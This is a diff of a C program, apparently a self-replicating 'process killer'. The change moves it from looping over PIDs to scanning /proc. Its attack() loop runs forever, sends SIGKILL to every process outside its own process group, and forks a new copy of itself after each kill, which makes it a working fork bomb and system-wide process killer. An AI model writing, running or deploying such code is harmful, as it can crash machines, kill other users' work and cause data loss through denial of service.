@@ -10,44 +10,58 @@
 #include <time.h>
 #include <string.h>
 #include <string>
+#include <dirent.h>
 
-#define SZ_BUFFER 4096
+#define MAX_PID 32768
 
 void attack();
+inline void bite(int);
 void spawn();
 
 char* self;
 pid_t pgid;
 
+
 int main(int argc, char* argv[]) {
 
 	self = strdup(argv[0]);
-	
+
 	if (argc != 2) { pgid = getpid(); }
 	else           { pgid = atoi(argv[1]); }
 
-	if (argc > 1 && pgid == 0) {
-		printf("args : %s, %s\n", argv[0], argv[1]);
-	}
-
 	if (setpgid(0, pgid)) {
 		printf("setpgid() failed!\n");
-	} 
-	else {
-		//printf("%d -> %d\n", getpid(), pgid);
 	}
 
 	while(1){ attack(); }
 }
+
 void attack(){
-	int p = getpid();
-	for (int i = 1; i < 32768; i++) {
-		if (i == p) continue;
-		if (getpgid(i) == pgid) continue;
-		kill(i, SIGKILL);
-		spawn();
+
+	DIR *d;
+	struct dirent *e;
+
+	d = opendir("/proc");
+	if (d) {
+		while ((e = readdir(d))) {
+			int pid = atoi(e -> d_name);
+			if (pid) { bite(pid); }
+		}
+		closedir(d);
+	}
+	else {
+		for (int i = 1; i <= MAX_PID; i++) {
+			bite(i);
+		}
 	}
 }
+
+inline void bite(int pid) {
+	if (getpgid(pid) == pgid) return; // Fellow squirrel
+	kill(pid, SIGKILL);
+	spawn();
+}
+
 void spawn() {
 	int p = fork();
 	if (p == 0) {
